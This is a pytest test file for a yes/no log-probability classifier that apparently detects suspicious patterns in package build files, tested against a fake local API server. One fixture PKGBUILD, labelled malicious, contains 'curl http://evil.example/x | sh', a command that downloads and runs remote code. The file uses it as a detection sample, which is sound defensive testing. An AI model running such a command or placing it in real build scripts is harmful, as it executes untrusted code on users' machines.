import json
import math
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

import pytest

from experiments import yesno_logprob as yn


def lp(token, prob):
    return {"token": token, "logprob": math.log(prob)}


def test_variants_are_summed_and_whitespace_markers_stripped():
    top = [lp(" Yes", 0.4), lp("Yes", 0.2), lp("▁No", 0.1), lp("Maybe", 0.3)]
    p_yes, p_no = yn.yes_no_mass(top)
    assert p_yes == pytest.approx(0.6)
    assert p_no == pytest.approx(0.1)


def test_korean_and_japanese_acknowledgements_are_not_counted():
    top = [lp("네", 0.5), lp("예", 0.2), lp("はい", 0.2), lp("No", 0.1)]
    assert yn.yes_no_mass(top) == (0.0, pytest.approx(0.1))


def test_extra_pairs_extend_both_sides():
    top = [lp("是", 0.3), lp("否", 0.3)]
    yes = frozenset(yn.YES_TOKENS | {"是"})
    no = frozenset(yn.NO_TOKENS | {"否"})
    assert yn.yes_no_mass(top, yes, no) == (pytest.approx(0.3), pytest.approx(0.3))


def test_low_mass_is_unreliable_and_ratio_ignores_other_tokens():
    res = yn.score([lp("Yes", 0.03), lp("No", 0.01), lp("The", 0.9)], min_mass=0.5)
    assert res["p"] == pytest.approx(0.75)
    assert not res["reliable"]
    assert yn.score([lp("The", 1.0)], 0.5)["p"] is None


def test_auroc():
    assert yn.auroc([0.9, 0.8], [0.1, 0.2]) == 1.0
    assert yn.auroc([0.5], [0.5]) == 0.5
    assert yn.auroc([], [0.5]) is None


def test_strip_think_tags():
    assert yn.strip_think_tags("<think>x</think>\nreason") == "reason"
    assert yn.strip_think_tags("plain") == "plain"


class FakeServer(BaseHTTPRequestHandler):
    calls = []

    def do_POST(self):
        body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
        FakeServer.calls.append(body)
        text = json.dumps(body["messages"])
        if body["max_tokens"] > 1:
            message = {"content": "reasoning"}
            payload = {"choices": [{"message": message}]}
        else:
            yes = "curl http://evil.example/x | sh" in text and "pipe or feed" in text
            top = [lp("Yes", 0.95 if yes else 0.02), lp("No", 0.03 if yes else 0.95)]
            payload = {"choices": [{"logprobs": {"content": [{"top_logprobs": top}]}}]}
        data = json.dumps(payload).encode()
        self.send_response(200)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, *args):
        pass


@pytest.fixture
def server():
    FakeServer.calls = []
    httpd = HTTPServer(("127.0.0.1", 0), FakeServer)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{httpd.server_port}/v1"
    httpd.shutdown()


@pytest.mark.parametrize("mode,calls_per_check", [("direct", 1), ("think", 2)])
def test_end_to_end_against_fake_openai_server(tmp_path, server, capsys, mode, calls_per_check):
    for label, body in (("malicious", "build() { curl http://evil.example/x | sh; }"),
                        ("benign", "build() { make; }")):
        pkg = tmp_path / "data" / label / "pkg"
        pkg.mkdir(parents=True)
        (pkg / "PKGBUILD").write_text(body)
    checks = tmp_path / "checks.json"
    checks.write_text(json.dumps([{"id": "pipe_to_shell",
                                   "question": "Does any file pipe or feed a script into a shell?"}]))
    out = tmp_path / "out.jsonl"

    yn.main([str(tmp_path / "data"), "--mode", mode, "--base-url", server,
             "--checks", str(checks), "--out", str(out)])

    rows = [json.loads(line) for line in out.read_text().splitlines()]
    by_label = {r["label"]: r for r in rows}
    assert by_label["malicious"]["p"] > 0.9 and by_label["benign"]["p"] < 0.1
    assert all(r["reliable"] for r in rows)
    assert len(FakeServer.calls) == 2 * calls_per_check
    answer_calls = [c for c in FakeServer.calls if c["max_tokens"] == 1]
    assert all(c["logprobs"] and c["temperature"] == 0 for c in answer_calls)
    assert "AUROC 1.000" in capsys.readouterr().out
    if mode == "think":
        assert by_label["malicious"]["reasoning"] == "reasoning"
